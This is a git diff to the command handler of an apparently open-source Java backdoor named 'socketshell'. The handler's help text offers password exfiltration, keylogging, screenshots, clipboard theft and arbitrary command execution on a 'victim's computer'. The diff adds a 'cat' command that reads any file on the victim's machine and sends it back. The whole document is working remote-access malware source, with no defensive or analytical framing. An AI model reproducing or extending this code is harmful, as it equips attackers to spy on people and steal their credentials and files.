@@ -1,5 +1,6 @@
 package com.github.thatcherdev.socketshell.backdoor;
 
+import java.util.Scanner;
 import org.apache.commons.io.FileUtils;
 import java.awt.datatransfer.DataFlavor;
 import java.awt.Rectangle;
@@ -30,7 +31,7 @@ public class HandleCommand {
 					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
 					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
 					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n[cb] Get text currently copied to victim's clipboard\n"
-					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
+					+ "[cat] Get data of a file on victim's computer\n[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
 		else if (command.startsWith("cmd"))
 			send = Utils.runCommand(command.substring(4));
 		else if (command.startsWith("ps"))
@@ -89,16 +90,25 @@ public class HandleCommand {
 				new File("screenshot.png").delete();
 				send = "Screenshot received";
 			} catch (Exception e) {
-				send = "An error occurred when trying to receive screenshot";
+				send = "An error occurred when trying to receive screenshot:\n" + e.getMessage();
 			}
 		else if (command.equals("cb"))
 			try {
 				String cb = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
 				send = "Victim's clipboard:\n" + cb;
 			} catch (Exception e) {
-				send = "An error occurred when trying to get victim's clipboard";
+				send = "An error occurred when trying to get victim's clipboard:\n" + e.getMessage();
 			}
-		else if (command.equals("remove")) {
+		else if (command.startsWith("cat")) {
+			try {
+				Scanner in = new Scanner(new File(command.substring(4)));
+				while (in.hasNextLine())
+					send += in.nextLine() + "\n";
+				in.close();
+			} catch (Exception e) {
+				send = "An error occurred when trying to get file:\n" + e.getMessage();
+			}
+		} else if (command.equals("remove")) {
 			try {
 				if (new File("gathered").exists())
 					FileUtils.forceDelete(new File("gathered"));
